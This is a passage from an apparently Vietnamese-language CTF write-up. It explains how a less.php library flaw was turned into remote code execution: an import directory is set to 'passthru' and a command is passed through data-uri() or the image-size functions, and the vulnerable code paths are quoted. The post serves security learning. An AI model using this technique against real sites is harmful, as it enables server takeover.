+</span></span></code></pre></td></tr></table></div></div><p><br><img src=https://hackmd.io/_uploads/SJUgRSQjye.png loading=lazy alt=image><br>Vậy là mình có Admin =))</p><h3 id=0-day-in-lessphp-library-leads-to-rce>0 day in less.php Library leads to RCE</h3><p>Mình đã stuck ở SQLi mà không leo lên được RCE, sau đó end giải thì author có push lên solution:<br><img src=https://hackmd.io/_uploads/S1UIJL7s1x.png loading=lazy alt=image><br>Oh damn, có lẽ SQLi không phải là intended. Anyways, không có cách này thì có cách khác thôi <code>¯\_(ツ)_/¯</code>
+Cái mình để ý là thư viện less.php có thể trigger RCE qua file less và tên thư mục import. Tiện lợi là khi lên admin ta sẽ thấy ta có quyền config bằng cách upload less file và cấu hình import directories:<br><img src=https://hackmd.io/_uploads/B1MbxLXiJg.png loading=lazy alt=image><br>Về cơ bản, khi ta tạo một thư mục để import, ta được điền vào đường dẫn vật lý và import path, các file CSS muốn import sẽ có thể sử dụng đường dẫn từ import path.
+Chức năng trigger RCE nằm tại function chỉnh sửa CSS và apply CSS, với route xử lý là /api/settings/css:<br><img src=https://hackmd.io/_uploads/H1qfHUQsJl.png loading=lazy alt=image><br>Đi sâu vào code, route /api/settings/css call đến method updateCustomCss tại RestController.php:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>#[Privilege(permissions: [Permissions::MANAGE_APPEARANCE])]
+</span></span><span class=line><span class=cl>private function updateCustomCss($currentUser, $data) {
+</span></span><span class=line><span class=cl>    try {
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        if (!isset($data[&#39;css&#39;])) {
+</span></span><span class=line><span class=cl>            return [
+</span></span><span class=line><span class=cl>                &#39;success&#39; =&gt; false,
+</span></span><span class=line><span class=cl>                &#39;message&#39; =&gt; &#39;CSS is required&#39;,
+</span></span><span class=line><span class=cl>                &#39;status&#39; =&gt; 400
+</span></span><span class=line><span class=cl>            ];
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        $result = $this-&gt;settings-&gt;updateCustomCss($data[&#39;css&#39;]);
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        .....
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>Tiếp tục call đến method updateCustomCss -> generateCSS tại Model Settings:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public function updateCustomCss($css) {
+</span></span><span class=line><span class=cl>    try {
+</span></span><span class=line><span class=cl>        $customLessPath = __DIR__ . &#39;/../../resources/less/custom.less&#39;;
+</span></span><span class=line><span class=cl>        file_put_contents($customLessPath, $css);
+</span></span><span class=line><span class=cl>        return $this-&gt;generateCSS();
+</span></span><span class=line><span class=cl>    } catch (Exception $e) {
+</span></span><span class=line><span class=cl>        return false;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>private function generateCSS() {
+</span></span><span class=line><span class=cl>    try {
+</span></span><span class=line><span class=cl>        $themeCssPath = __DIR__ . &#39;/../../public/assets/css/main.css&#39;;
+</span></span><span class=line><span class=cl>        $css = file_get_contents($themeCssPath);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        $customLessPath = __DIR__ . &#39;/../../resources/less/custom.less&#39;;
+</span></span><span class=line><span class=cl>        if (file_exists($customLessPath)) {
+</span></span><span class=line><span class=cl>            $customLess = file_get_contents($customLessPath);
+</span></span><span class=line><span class=cl>            $parser = new \Less_Parser();
+</span></span><span class=line><span class=cl>            $importDirs = $this-&gt;getImportDirectories();
+</span></span><span class=line><span class=cl>            $parser-&gt;SetImportDirs($importDirs);
+</span></span><span class=line><span class=cl>            $parser-&gt;parse($customLess);
+</span></span><span class=line><span class=cl>            $customCSS = $parser-&gt;getCss();
+</span></span><span class=line><span class=cl>            $css .= &#34;\n/* Custom CSS */\n&#34; . $customCSS;
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        ....
+</span></span><span class=line><span class=cl>    } catch (Exception $e) {
+</span></span><span class=line><span class=cl>        return false;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>Tại đây Less_Parser có nhiệm vụ sử dụng import directories đã có và set vào import dir, và lấy nội dung css của chúng ta để tạo thành Css trong method getCss()
+Từ đây thì chúng ta sẽ xuất hiện lỗ hổng khi sử dụng function data-uri trong Less, vốn được sử dụng để nhúng file vào CSS theo path hoặc nhúng bằng base64. Tại <code>Less_Tree_Call::compile</code> khi match thấy method data-uri sẽ set tên function là datauri và call đến method <code>Less_Functions::datauri</code>:<br><img src=https://hackmd.io/_uploads/SJQjjImoyg.png loading=lazy alt=image><br>Hàm đó sẽ tiếp tục call đến <code>Less_FileManager::getFilePath</code><br><img src=https://hackmd.io/_uploads/Sy2zpIXjyl.png loading=lazy alt=image><br>Tại hàm này thì đường dẫn $rooturi được lấy từ $import_dirs được kiểm tra có phải hàm hay không, nếu có thì sẽ sử dụng như là 1 function với param là $filename là giá trị nằm trong function data-uri đã được extract từ method trước đó:<br><img src=https://hackmd.io/_uploads/rJ6mpLmjkg.png loading=lazy alt=image><br>Như vậy về cơ bản, ta cần tạo một import directories có giá trị là 1 hàm nhận vào 1 tham số, cộng với việc truyền dữ liệu vào bên trong function <code>data-uri</code>, khi LESS kiểm tra tên file sẽ trigger code injection. Để RCE thì ta ưu tiên sử dụng các hàm hiển thị câu lệnh mà có khả năng nhận vào 1 tham số: system, passthru.
+Mình tạo import directories có tên import path là passthru:<br><img src=https://hackmd.io/_uploads/Syl1C87jyx.png loading=lazy alt=image><br>Sau đó chỉ cần trigger lỗi RCE thông qua api custom CSS là có thể RCE:<br><img src=https://hackmd.io/_uploads/ByAUCIQj1g.png loading=lazy alt=image><br>Lụm flag bằng command <code>/getflag PWNME</code><br><img src=https://hackmd.io/_uploads/BJ4CC8Qj1l.png loading=lazy alt=image><br></p><h4 id=funny-walkaround>Funny Walkaround</h4><p>Vì sink lỗ hổng nằm tại method <code>Less_FileManager::getFilePath</code>, tất cả các funtions call đến method này đều có thể dẫn đến RCE, quan sát trong lib/Less/Functions.php thì ngoài method datauri thì còn có method getImageSize sử dụng đến method này, cùng với tham số truyền vào tương tự:<br><img src=https://hackmd.io/_uploads/B1yi4wQsJe.png loading=lazy alt=image><br>Có 3 function của less sử dụng method này, bao gồm:</p><ul><li>image-size: imagesize</li><li>image-width: imagewidth</li><li>image-height: imageheight</li></ul><p><br><img src=https://hackmd.io/_uploads/Hkh0VPQjJx.png loading=lazy alt=image><br>Nên ngoài data-uri(), ta hoàn toàn có thể sử dụng 3 function này, cách sử dụng cũng tương tự, tuy nhiên sẽ văng ra kha khá lỗi:<br><img src=https://hackmd.io/_uploads/rk7dHvXi1x.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/H17jHDmo1e.png loading=lazy alt=image></p></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2026 kev1n's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
